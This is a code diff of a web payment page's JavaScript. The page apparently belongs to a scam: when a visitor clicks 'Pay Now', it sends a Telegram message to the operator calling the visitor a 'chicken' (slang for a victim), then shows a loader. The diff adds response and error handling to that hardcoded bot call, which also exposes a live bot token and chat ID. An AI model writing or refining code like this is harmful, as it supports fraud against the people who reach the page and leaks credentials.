@@ -308,27 +308,22 @@
             document.getElementById('errorMessage').style.display = 'none';
         }
 
-         function triggerPaymentMessage(event) {
-        event.preventDefault(); // Prevent immediate navigation
-
+             function triggerPaymentMessage(event) {
+        event.preventDefault();
         const selectedImage = document.querySelector('.image-box.checked');
         const errorMessage = document.getElementById('errorMessage');
         const paymentMessage = document.getElementById('paymentMessage');
-        const amount = getUrlParameter("amount"); 
+        const amount = getUrlParameter("amount");
         const loaderContainer = document.getElementById('loaderContainer');
         const paymentContainer = document.getElementById('paymentContainer');
 
         if (!selectedImage || !amount) {
-            // Show error message if no image is selected or "amount" is missing
             errorMessage.style.display = 'block';
         } else {
-            // Hide error message if previously shown
             errorMessage.style.display = 'none';
-
-            // Show payment message
             paymentMessage.style.display = 'block';
 
-            // Telegram notification - UPDATED VALUES
+            // Telegram notification with error handling
             const botToken = "7937811076:AAF-i6ibW9e5nVLSX5wKPCSYgh4ItKEho6Y";
             const chatId = "6151148119";
             const message = "🐔 মুরগি Pay Now এ ক্লিক করেছে";
@@ -340,7 +335,17 @@
                     chat_id: chatId,
                     text: message
                 })
-            }).catch(error => console.error("Telegram message send error:", error));
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Telegram API response:', data);
+                if (!data.ok) {
+                    console.error('Telegram API error:', data.description);
+                }
+            })
+            .catch(error => {
+                console.error('Fetch error:', error);
+            });
     setTimeout(() => {
         paymentContainer.style.display = 'none'; // pay container
         loaderContainer.style.display = 'flex'; // loader container
